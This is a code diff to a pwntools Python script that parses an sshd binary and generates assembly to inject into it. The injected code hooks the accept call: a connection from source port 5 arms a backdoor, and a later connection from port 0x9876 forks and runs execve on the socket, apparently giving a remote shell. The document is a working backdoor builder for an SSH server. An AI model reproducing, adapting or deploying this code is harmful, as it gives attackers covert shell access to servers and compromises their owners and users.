@@ -1,5 +1,4 @@
 from pwn import *
-# from elftools.elf.elffile import ELFFile
 elf_name = './sshd'
 context.arch = 'amd64'
 sshd = ELF(elf_name)
@@ -7,25 +6,20 @@ sshd = ELF(elf_name)
 def get_got_offset (func: str) -> int:
     return sshd.got[func]
 
-def get_seg_pad(flag: int) -> int:
+def get_seg_gap(flag: int) -> int:
     mem_len = 0
-    mem_size = 0
 
     for segment in sshd.iter_segments():
         if segment['p_type'] == 'PT_LOAD':
             if (segment['p_flags'] == flag):
                 mem_len = segment['p_memsz']
-                break
-            mem_size += (segment['p_memsz'] & ~0xfff) + 0x1000
+                return mem_len + segment['p_vaddr']
 
-    if mem_len == 0:
-        print("segment with flag not found")
-        exit(1)
-    return mem_len + mem_size
+    print ('elf parse error')
+    exit (1)
 
 accept_offset = get_got_offset ('accept')
 __errno_location_offset = get_got_offset ('__errno_location')
-__libc_start_main_offset = get_got_offset ('__libc_start_main')
 
 with open ('./include/got_offset.h', 'w') as f:
     f.write('#ifndef GOT_OFFSET\n')
@@ -33,11 +27,10 @@ with open ('./include/got_offset.h', 'w') as f:
     f.write('#include <stdint.h>\n')
     f.write('uint64_t accept_offset = ' + str(hex(accept_offset)) + ';\n')
     f.write('uint64_t __errno_location_offset = ' + str(hex(__errno_location_offset)) + ';\n')
-    f.write('uint64_t __libc_start_main_offset = ' + str(hex(__libc_start_main_offset)) + ';\n\n')
     f.write('#endif\n')
 
-rw_gap = (get_seg_pad(6) & ~0x7) + 0x8
-rx_gap = (get_seg_pad(5) & ~0x7) + 0x8
+rw_gap = (get_seg_gap(6) & ~0x7) + 0x8
+rx_gap = (get_seg_gap(5) & ~0x7) + 0x8
 
 with open('./include/seg_gaps.h', 'w') as f:
     f.write('#ifndef SEG_GAPS\n')
@@ -49,8 +42,10 @@ with open('./include/seg_gaps.h', 'w') as f:
 
 text = (
 f"""
-call [rip+{__libc_start_main_offset - rx_gap - 6}]
-// __libc_start_main got addr, but hjack to accept now
+push 0x2b
+pop rax
+syscall
+
 push rdi
 push rsi
 push rdx
@@ -60,33 +55,46 @@ push r8
 push r9
 push rax
 
-lea rdi, [rip+{rw_gap - rx_gap - 0x18}]
-
+lea rdi, [rip+{rw_gap - rx_gap - 0x17}]
 mov rax, [rsi+2]
-// port
+"""
+# get connection port
+
+f"""
 cmp ax, 0x0500
 je set_backdoor_open
-// port 5 means open backdoor
-cmp ax, 0x7698
-// port 0x9876 means log in with backdoor
-// also it will close the backdoor
-jne close_backdoor
+"""
+# port 5 means open backdoor
 
+f"""
+cmp ax, 0x7698
+jne close_backdoor
+"""
+# port 0x9876 means log in with backdoor
+# also it will close the backdoor
+
+f"""
 is_backdoor_open:
 mov rax, [rdi]
 cmp al, 0x1
 jne close_backdoor
-// return backdoor is closed
+"""
+# return backdoor is closed
 
+f"""
 backdoor:
-push 0x39
-pop rax
+mov rax, 0x39
 syscall
-// fork
+"""
+# fork
+
+f"""
 cmp al, 0x0
 jne act_if_accept_failed
-// father should return with error
+"""
+# father should return with error
 
+f"""
 pop rdi
 push 0x21
 pop rax
@@ -124,24 +132,33 @@ xor edx, edx
 push 0x3b
 pop rax
 syscall
-// execve
+"""
+# execve
 
+f"""
 set_backdoor_open:
 mov byte ptr [rdi], 0x1
-// set backdoor open
 jmp return
+"""
+# set backdoor open
 
+f"""
 act_if_accept_failed:
 pop rax
 mov rax, -1
 push rax
-call [rip + {__errno_location_offset - rx_gap - 0x87}]
+call [rip + {__errno_location_offset - rx_gap - 0x8a}]
 mov dword ptr [rax], 4
+"""
+# set errno 4, set return value -1
 
+f"""
 close_backdoor:
 mov byte ptr [rdi], 0x0
-// close backdoor
+"""
+# close backdoor
 
+f"""
 return:
 
 pop rax
@@ -177,7 +194,6 @@ with open ('./include/inject_code.h', 'w') as f:
 print ('\nrw_gap_start at: ' + str (hex(rw_gap)))
 print ('rx_gap_start at: ' + str (hex(rx_gap)))
 print ('accept_offset at: ' + str(hex(accept_offset)))
-print ('__libc_start_main_offset at: ' + str(hex(__libc_start_main_offset)))
 print ('__errno_location_offset at: ' + str(hex(__errno_location_offset)))
 print('asm success\n')
 
